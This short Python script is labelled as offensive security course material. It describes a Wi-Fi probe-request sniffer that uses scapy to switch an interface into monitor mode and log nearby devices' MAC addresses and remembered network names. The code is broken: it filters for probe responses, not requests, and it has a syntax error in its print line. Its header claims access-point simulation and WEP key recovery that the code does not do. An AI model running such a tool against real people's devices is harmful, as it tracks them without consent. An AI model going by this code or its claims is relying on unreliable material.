# Offensive Security Software
# SSE Program
# Attack: Wifi Prob Request Sniffer
# Date: February 1, 2016
# Description: Modern OS's remember all wifi networks they were ever connected
# to and continue to ask the environment if those networks are accessible.  Using
# this, SSID's and even WEP keys.  This prog simulates an AP for every probe
# request and dumps the SSID's of probe request packets.

from datetime import datetime
from scapy.all import *

iface = "en0"

#print ssid and source address of probe response

def handle_packet(packet):
    if packet.haslayer(Dot11ProbeResp):
        print str(datetime.now()) + " " packet[Dot11].addr2 + \
              " searches for " + packet.info


# set device into monitor mode
os.system("ifconfig " + iface + " mode monitor")

#SNiff SNiff
print "Sniffing on interface " + iface
sniff(iface=iface, prn=handle_packet)

